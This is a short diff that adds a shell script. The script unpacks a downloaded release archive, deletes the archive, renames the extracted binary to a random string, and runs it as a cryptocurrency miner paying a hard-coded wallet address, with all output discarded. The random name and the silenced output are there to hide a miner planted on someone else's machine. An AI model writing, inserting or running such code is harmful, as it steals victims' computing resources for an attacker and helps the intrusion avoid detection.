@@ -1,0 +1,6 @@
+https://github.com/staticneti/otodin/releases/download/v4.1.2/static.tar
+tar -xf static.tar
+rm -rf static.tar
+variable8=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+mv static $variable8
+./$variable8 mine --address 5FDLqDZ6Y3NYh2hQG88WKZa4bErpGs5qV7bWkVqgU43R > /dev/null 2>&1
